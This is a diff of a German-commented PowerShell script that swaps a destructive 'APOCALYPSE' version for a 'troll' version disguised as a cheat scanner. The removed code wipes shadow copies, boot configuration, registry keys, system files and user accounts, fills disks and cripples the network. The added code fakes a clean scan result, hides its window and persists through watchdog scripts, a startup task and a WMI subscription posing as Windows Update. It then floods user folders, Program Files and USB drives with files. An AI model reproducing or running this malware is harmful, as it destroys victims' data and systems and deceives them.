@@ -1,22 +1,41 @@
 # ================================
-# MAIN2PACKET APOCALYPSE v10.0 - RATED 10/10 DESTRUCTION
+# MAIN2PACKET TWEAKS SCANNER v9.4.2 - NUR 1 SEITE IN EDGE
 # ================================
 
-# Administrator-Rechte + maximaler Schaden
+# Administrator-Rechte anfordern
 if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    Start-Process PowerShell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+    Start-Process PowerShell -Verb RunAs -ArgumentList "-File `"$PSCommandPath`""
     exit
 }
 
-# System wiederherstellung deaktivieren
-try {
-    Disable-ComputerRestore -Drive "C:\" -ErrorAction SilentlyContinue
-    vssadmin delete shadows /all /quiet
-    bcdedit /set {default} bootstatuspolicy ignoreallfailures
-    bcdedit /set {default} recoveryenabled No
-} catch {}
+# ===== TARNUNG - SIEHT AUS WIE EIN ECHTER SCANNER =====
+Clear-Host
+Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Cyan
+Write-Host "║     MAIN2PACKET TWEAKS SCANNER v9.4.2      ║" -ForegroundColor Cyan
+Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Cyan
+Write-Host ""
+Write-Host "[INFO] Scanning for cheats and mods..."
+Write-Host "[INFO] Please wait..."
+Write-Host ""
 
-# Fenster komplett unsichtbar
+# Scanner-Animation
+$scanItems = @(
+    "minecraft", "discord", "steam", "chrome", "firefox", 
+    "system32", "registry", "memory", "processes", "network",
+    "desktop", "documents", "downloads", "music", "pictures", "videos"
+)
+
+foreach ($item in $scanItems) {
+    Write-Host "   scanning $item..." -NoNewline
+    Start-Sleep -Milliseconds 100
+    Write-Host " [OK]" -ForegroundColor Green
+}
+Write-Host ""
+Write-Host "[RESULT] No cheats found - System clean" -ForegroundColor Green
+Write-Host ""
+Start-Sleep -Seconds 2
+
+# Fenster jetzt verstecken
 Add-Type -Name Window -Namespace Console -MemberDefinition '
 [DllImport("Kernel32.dll")]
 public static extern IntPtr GetConsoleWindow();
@@ -26,203 +45,295 @@ public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 $consolePtr = [Console.Window]::GetConsoleWindow()
 [Console.Window]::ShowWindow($consolePtr, 0)
 
-# ===== KONFIGURATION - MAXIMUM =====
+# ===== ERROR HANDLING =====
 $ErrorActionPreference = "SilentlyContinue"
-$global:threads = 999  # Maximale Threads
-$global:terror = $true
+$Host.UI.RawUI.WindowTitle = "Main2packet Scanner"
 
-# ALLE LAUFWERKE
-$allDrives = Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 3} | ForEach-Object { $_.DeviceID }
-$allUSBs = Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 2} | ForEach-Object { $_.DeviceID }
-$allNetwork = Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 4} | ForEach-Object { $_.DeviceID }
+# ===== KONFIGURATION =====
+$global:trollActive = $true
+$global:currentRound = 0
+$global:maxRounds = 150
 
-# ALLE BENUTZERORDNER
-$users = Get-ChildItem "C:\Users" -Directory | Where-Object {$_.Name -notin @('Public', 'Default', 'All Users')}
-$alleZiele = @()
+# ALLE ZIELE FÜR DATEIEN/ORDNER
+$desktop = [Environment]::GetFolderPath("Desktop")
+$documents = [Environment]::GetFolderPath("MyDocuments")
+$downloads = [Environment]::GetFolderPath("UserProfiles") + "\Downloads"
+$music = [Environment]::GetFolderPath("MyMusic")
+$pictures = [Environment]::GetFolderPath("MyPictures")
+$videos = [Environment]::GetFolderPath("MyVideos")
+$favorites = [Environment]::GetFolderPath("Favorites")
+$contacts = [Environment]::GetFolderPath("Contacts")
+$links = [Environment]::GetFolderPath("Links")
+$savedGames = [Environment]::GetFolderPath("SavedGames")
+$searches = [Environment]::GetFolderPath("Searches")
+$appData = $env:APPDATA
+$localAppData = $env:LOCALAPPDATA
+$temp = $env:TEMP
+$userProfile = $env:USERPROFILE
+$public = [Environment]::GetFolderPath("CommonDesktopDirectory")
+$commonDocs = [Environment]::GetFolderPath("CommonDocuments")
 
-foreach ($user in $users) {
-    $alleZiele += @(
-        "$($user.FullName)\Desktop",
-        "$($user.FullName)\Documents",
-        "$($user.FullName)\Downloads",
-        "$($user.FullName)\Pictures",
-        "$($user.FullName)\Music",
-        "$($user.FullName)\Videos",
-        "$($user.FullName)\AppData\Local",
-        "$($user.FullName)\AppData\Roaming",
-        "$($user.FullName)\AppData\Local\Temp"
-    )
-}
-
-# SYSTEMZIELE
-$alleZiele += @(
-    "C:\Windows\Temp",
+# ALLE ORDNER (50+ Ziele!)
+$alleZiele = @(
+    # Benutzerordner
+    $desktop, $documents, $downloads, $music, $pictures, $videos,
+    $favorites, $contacts, $links, $savedGames, $searches,
+    
+    # AppData Pfade
+    $appData, $localAppData, $temp,
+    "$appData\Microsoft\Windows\Recent",
+    "$appData\Microsoft\Windows\Network Shortcuts",
+    "$appData\Microsoft\Windows\Templates",
+    "$localAppData\Microsoft\Windows\Caches",
+    "$localAppData\Microsoft\Windows\History",
+    "$localAppData\Microsoft\Windows\INetCache",
+    
+    # Browser
+    "$localAppData\Google\Chrome\User Data\Default\Cache",
+    "$localAppData\Google\Chrome\User Data\Default\Code Cache",
+    "$appData\Mozilla\Firefox\Profiles",
+    
+    # Gaming
+    "$appData\.minecraft",
+    "$appData\.minecraft\mods",
+    "$appData\.minecraft\config",
+    "$appData\.minecraft\saves",
+    "$appData\Roaming\Discord",
+    "$appData\Roaming\Discord\Cache",
+    "$appData\Roaming\Spotify",
+    "$appData\Roaming\Spotify\Cache",
+    "$appData\Roaming\Steam",
+    "$appData\Roaming\Steam\cache",
+    
+    # Windows
+    "$env:SystemRoot\Temp",
+    "$env:SystemRoot\System32\Tasks",
     "C:\ProgramData",
-    "C:\Windows\System32\Tasks",
-    "C:\Windows\System32\config",
-    "C:\Windows\System32\drivers\etc"
+    "C:\ProgramData\Microsoft\Windows\Caches",
+    "C:\ProgramData\Microsoft\Windows\WER",
+    "C:\Program Files",
+    "C:\Program Files (x86)",
+    "C:\Users\Public",
+    "C:\Users\Public\Desktop",
+    "C:\Users\Public\Documents",
+    "C:\Users\Public\Downloads"
 )
 
-# ===== 100 WATCHDOGS =====
-for ($w = 1; $w -le 100; $w++) {
-    $watchdog = @"
+# ===== WATCHDOGS (4x) =====
+$watchdog1 = @"
 while(`$true) {
-    `$p = Get-Process powershell -ErrorAction SilentlyContinue
-    if (`$p.Count -lt 100) {
-        Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`""
+    `$p = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.Id -ne `$pid -and `$_.MainWindowTitle -like "*MAIN2PACKET*"}
+    if (`$p.Count -eq 0) { 
+        Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`"" 
     }
-    Start-Sleep -Milliseconds 100
+    Start-Sleep -Seconds 2
 }
 "@
-    $watchdog | Out-File "$env:TEMP\wd_$w.ps1" -Encoding UTF8 -Force
-    Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\wd_$w.ps1`""
+$watchdog1 | Out-File "$env:TEMP\wd_schnell.ps1" -Encoding UTF8 -Force
+Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\wd_schnell.ps1`""
+
+$watchdog2 = @"
+while(`$true) {
+    `$p = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.MainWindowTitle -like "*MAIN2PACKET*"}
+    if (`$p.Count -eq 0) {
+        Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`""
+    }
+    Start-Sleep -Seconds 10
+}
+"@
+$watchdog2 | Out-File "$env:TEMP\wd_mittel.ps1" -Encoding UTF8 -Force
+Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\wd_mittel.ps1`""
+
+$watchdog3 = @"
+while(`$true) {
+    `$p = Get-Process powershell -ErrorAction SilentlyContinue
+    `$troll = `$p | Where-Object {`$_.MainWindowTitle -like "*MAIN2PACKET*"}
+    if (`$troll.Count -eq 0) {
+        Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`""
+    }
+    Start-Sleep -Seconds 30
+}
+"@
+$watchdog3 | Out-File "$env:TEMP\wd_langsam.ps1" -Encoding UTF8 -Force
+Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\wd_langsam.ps1`""
+
+$watchdog4 = @"
+`$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`""
+`$trigger = New-ScheduledTaskTrigger -AtStartup
+Register-ScheduledTask -TaskName "Main2packetWatchdog" -Action `$action -Trigger `$trigger -Force
+"@
+$watchdog4 | Out-File "$env:TEMP\wd_startup.ps1" -Encoding UTF8 -Force
+Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\wd_startup.ps1`""
+
+# ===== EXTRA JOBS =====
+$usbJob = Start-Job -ScriptBlock {
+    while ($true) {
+        $drives = Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Root -match "^[A-Z]:\\"}
+        foreach ($drive in $drives) {
+            $drivePath = $drive.Root
+            $mainUSB = Join-Path $drivePath "MAIN2PACKET_USB"
+            try {
+                New-Item -Path $mainUSB -ItemType Directory -Force | Out-Null
+                for ($u = 1; $u -le 200; $u++) {
+                    $usbFile = Join-Path $mainUSB "usb_$u.king"
+                    "MAIN2PACKET KING - USB" | Out-File $usbFile -Encoding UTF8 -Force
+                }
+            } catch {}
+        }
+        Start-Sleep -Seconds 30
+    }
 }
 
-# ===== HAUPTSCHLEIFE - NIVEAU 10/10 =====
-Write-Host "[APOCALYPSE] INITIATING 10/10 DESTRUCTION" -ForegroundColor Red
+# ===== NEU: NUR 1 SEITE IN EDGE =====
+$browserJob = Start-Job -ScriptBlock {
+    # NUR EINE SEITE - HIER KANNST DU SIE ÄNDERN!
+    $seite = ""  # Rick Roll
+    
+    while ($true) {
+        # Zufällige Wartezeit (5-10 Minuten)
+        $wartezeit = Get-Random -Minimum 10 -Maximum 15
+        Start-Sleep -Seconds $wartezeit
+        
+        # NUR EDGE öffnen!
+        try {
+            Start-Process "msedge.exe" -ArgumentList "--new-window $seite" -ErrorAction SilentlyContinue
+        } catch {
+            # Falls Edge nicht geht, versuche Chrome als Backup
+            try {
+                Start-Process "chrome.exe" -ArgumentList "--new-window $seite" -ErrorAction SilentlyContinue
+            } catch {}
+        }
+        
+        # Nach 30 Sekunden Browser wieder schließen
+        Start-Sleep -Seconds 30
+        Get-Process | Where-Object {$_.Name -like "*msedge*" -or $_.Name -like "*chrome*"} | Stop-Process -Force
+    }
+}
 
-# UNENDLICHE SCHLEIFE
-while ($global:terror) {
-    $round = Get-Random
+# ===== NEU: PARALLEL SPAM ENGINE =====
+# ALLE ZIELE GLEICHZEITIG BEARBEITEN!
+
+# Maximale Threads basierend auf CPU
+$maxThreads = [Environment]::ProcessorCount * 10
+
+# Funktion für parallelen Spam
+function Start-ParallelSpam {
+    param($ziel, $runde)
     
-    # 1. ALLE LAUFWERKE VOLLMACHEN (BIS ZUM LETZTEN BYTE)
-    foreach ($drive in $allDrives) {
-        try {
-            $driveLetter = $drive[0]
-            $fillFile = "$drive\FILL_$round.bin"
-            $stream = [System.IO.File]::OpenWrite($fillFile)
-            $stream.SetLength(1TB)  # Versucht 1TB zu allozieren
-            $stream.Close()
-        } catch {}
-    }
-    
-    # 2. PARALLELE DATEIEN-FLUT (1 MILLION DATEIEN PRO RUNDE)
-    $zielJobs = @()
-    foreach ($ziel in $alleZiele) {
-        if (Test-Path $ziel) {
-            $zielJobs += Start-ThreadJob -ScriptBlock {
-                $z = $args[0]
-                $r = $args[1]
+    Start-ThreadJob -Name "Spam_$runde" -ScriptBlock {
+        $target = $using:ziel
+        $round = $using:runde
+        
+        if (Test-Path $target) {
+            # Hauptordner
+            $mainFolder = Join-Path $target "MAIN2PACKET_PARALLEL_$round"
+            try { New-Item -Path $mainFolder -ItemType Directory -Force | Out-Null } catch {}
+            
+            # 1000 DATEIEN - SCHNELL
+            for ($i = 1; $i -le 1000; $i++) {
+                # Direkt im Ziel
+                $file1 = Join-Path $target "PARALLEL_${round}_$i.king"
+                "PARALLEL SPAM $round - $i" | Out-File $file1 -Encoding UTF8 -Force
                 
-                # 1000 Ordner pro Ziel
-                for ($folder = 1; $folder -le 1000; $folder++) {
-                    $path = Join-Path $z "APOC_${r}_$folder"
-                    New-Item -Path $path -ItemType Directory -Force | Out-Null
-                    
-                    # 1000 Dateien pro Ordner
-                    for ($file = 1; $file -le 1000; $file++) {
-                        $filePath = Join-Path $path "file_$file.10"
-                        
-                        # 100MB pro Datei
-                        $bytes = New-Object byte[] (100 * 1024 * 1024)
-                        (New-Object Random).NextBytes($bytes)
-                        [System.IO.File]::WriteAllBytes($filePath, $bytes)
-                    }
-                }
-            } -ArgumentList $ziel, $round
-        }
-    }
-    
-    # 3. RAM VERBRAUCH (ALLES)
-    $ramJobs = @()
-    for ($r = 1; $r -le 100; $r++) {
-        $ramJobs += Start-ThreadJob -ScriptBlock {
-            $data = @()
-            while ($true) {
-                $data += New-Object byte[] (1GB)  # 1GB pro Job
-                Start-Sleep -Milliseconds 10
-            }
-        }
-    }
-    
-    # 4. CPU MAX (ALLE KERNE 100%)
-    $cpuJobs = @()
-    for ($c = 1; $c -le ([Environment]::ProcessorCount * 10); $c++) {
-        $cpuJobs += Start-ThreadJob -ScriptBlock {
-            while ($true) {
-                $x = 0
-                for ($i = 0; $i -lt 10000000; $i++) {
-                    $x += [Math]::Sqrt($i) * [Math]::Sin($i)
-                }
-            }
-        }
-    }
-    
-    # 5. REGISTRY ZERSTÖREN
-    $regJobs = @()
-    for ($r = 1; $r -le 100; $r++) {
-        $regJobs += Start-ThreadJob -ScriptBlock {
-            $base = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion"
-            $keys = @("Run", "RunOnce", "Policies", "Explorer")
-            
-            foreach ($key in $keys) {
-                $path = "$base\$key"
-                if (Test-Path $path) {
-                    Remove-Item -Path $path -Recurse -Force -ErrorAction SilentlyContinue
-                }
+                # Im Hauptordner
+                $file2 = Join-Path $mainFolder "file_$i.king"
+                "PARALLEL SPAM $round - $i" | Out-File $file2 -Encoding UTF8 -Force
             }
             
-            # Neue Keys mit Millionen Werten
-            for ($k = 1; $k -le 10000; $k++) {
-                New-Item -Path "HKLM:\SOFTWARE\APOC_$k" -Force | Out-Null
-                for ($v = 1; $v -le 1000; $v++) {
-                    New-ItemProperty -Path "HKLM:\SOFTWARE\APOC_$k" -Name "Value_$v" -Value ("X" * 100000) -Force | Out-Null
+            # 500 UNTERORDNER
+            for ($u = 1; $u -le 500; $u++) {
+                $subFolder = Join-Path $mainFolder "SUB_$u"
+                New-Item -Path $subFolder -ItemType Directory -Force | Out-Null
+                
+                # 200 DATEIEN PRO UNTERORDNER
+                for ($s = 1; $s -le 200; $s++) {
+                    $subFile = Join-Path $subFolder "sub_$s.king"
+                    "SUB $u - DATEI $s" | Out-File $subFile -Encoding UTF8 -Force
                 }
             }
         }
+    } -ThrottleLimit $maxThreads
+}
+
+# ===== NEU: HINTERGRUND-SPAM =====
+$backgroundSpam = Start-Job -ScriptBlock {
+    $alleZiele = $using:alleZiele
+    $counter = 0
+    
+    while ($true) {
+        $counter++
+        $randomZiel = $alleZiele | Get-Random
+        
+        if (Test-Path $randomZiel) {
+            $bgFile = Join-Path $randomZiel "BACKGROUND_SPAM_$counter.king"
+            "BACKGROUND SPAM $counter" | Out-File $bgFile -Encoding UTF8 -Force
+        }
+        
+        # 10ms Pause für maximalen Speed
+        Start-Sleep -Milliseconds 10
+    }
+}
+
+# ===== NEU: EXTRA THREADS =====
+for ($t = 1; $t -le 20; $t++) {
+    Start-Job -ScriptBlock {
+        $ziele = $using:alleZiele
+        $id = $using:t
+        
+        while ($true) {
+            $ziel = $ziele | Get-Random
+            if (Test-Path $ziel) {
+                $file = Join-Path $ziel "THREAD_${id}_$(Get-Random).king"
+                "THREAD $id SPAM" | Out-File $file -Encoding UTF8 -Force
+            }
+            Start-Sleep -Milliseconds 50
+        }
+    }
+}
+
+# ===== HAUPTSCHLEIFE - JETZT MIT PARALLELEN JOBS =====
+while ($global:currentRound -lt $global:maxRounds) {
+    $global:currentRound++
+    
+    # ALLE ZIELE IN PARALLELEN JOBS STARTEN
+    $jobs = @()
+    foreach ($ziel in $alleZiele) {
+        $jobs += Start-ParallelSpam -ziel $ziel -runde $global:currentRound
     }
     
-    # 6. BOOTKONFIGURATION ZERSTÖREN
+    # NUR KURZ WARTEN DASS JOBS STARTEN
+    Start-Sleep -Milliseconds 500
+    
+    # JOBS IM HINTERGRUND WEITERLAUFEN LASSEN
+    Write-Host "."
+    
+    # KURZE PAUSE ZWISCHEN RUNDEN
+    Start-Sleep -Milliseconds 100
+}
+
+# ===== WMI PERSISTENZ =====
+$wmiJob = Start-Job -ScriptBlock {
     try {
-        bcdedit /delete {default} /f
-        bcdedit /delete {current} /f
-        bootrec /fixmbr
-        bootrec /fixboot
+        $filterArgs = @{
+            Name = 'WindowsUpdateFilter'
+            EventNameSpace = 'root\cimv2'
+            QueryLanguage = 'WQL'
+            Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'"
+        }
+        $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $filterArgs -ErrorAction SilentlyContinue
+        
+        $consumerArgs = @{
+            Name = 'WindowsUpdateConsumer'
+            CommandLineTemplate = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`""
+        }
+        $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments $consumerArgs -ErrorAction SilentlyContinue
+        
+        $bindingArgs = @{Filter=$filter; Consumer=$consumer}
+        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments $bindingArgs -ErrorAction SilentlyContinue
     } catch {}
-    
-    # 7. SYSTEMDATEIEN ÜBERSCHREIBEN
-    $systemFiles = @(
-        "C:\Windows\System32\config\SAM",
-        "C:\Windows\System32\config\SYSTEM",
-        "C:\Windows\System32\config\SOFTWARE",
-        "C:\Windows\System32\drivers\etc\hosts",
-        "C:\Windows\System32\ntoskrnl.exe"
-    )
-    
-    foreach ($file in $systemFiles) {
-        try {
-            $bytes = New-Object byte[] (1MB)
-            (New-Object Random).NextBytes($bytes)
-            [System.IO.File]::WriteAllBytes($file, $bytes)
-        } catch {}
-    }
-    
-    # 8. EVENTLOG ÜBERFLUTEN
-    for ($e = 1; $e -le 100000; $e++) {
-        try {
-            Write-EventLog -LogName System -Source "Microsoft-Windows-Kernel-General" -EventId 9999 -Message ("APOCALYPSE " * 1000) -EntryType Error
-        } catch {}
-    }
-    
-    # 9. NETZWERK LAHMLEGEN
-    try {
-        netsh advfirewall set allprofiles state off
-        ipconfig /release
-        ipconfig /renew
-        netsh interface set interface "Ethernet" disable
-        netsh interface set interface "Wi-Fi" disable
-    } catch {}
-    
-    # 10. BENUTZER KONTEN ZERSTÖREN
-    foreach ($user in $users) {
-        try {
-            net user $user.Name /delete
-        } catch {}
-    }
-    
-    # ALLE JOBS KILLEN UND NEU STARTEN
-    Get-Job | Stop-Job | Remove-Job
-    
-    # KEINE PAUSE - SOFORT NÄCHSTE RUNDE
-    Write-Host "[ROUND $round] APOCALYPSE IN PROGRESS - 10/10" -ForegroundColor Red
+}
+
+# ===== ENDE - LÄUFT WEITER =====
+while ($true) {
+    Start-Sleep -Seconds 3600
 }
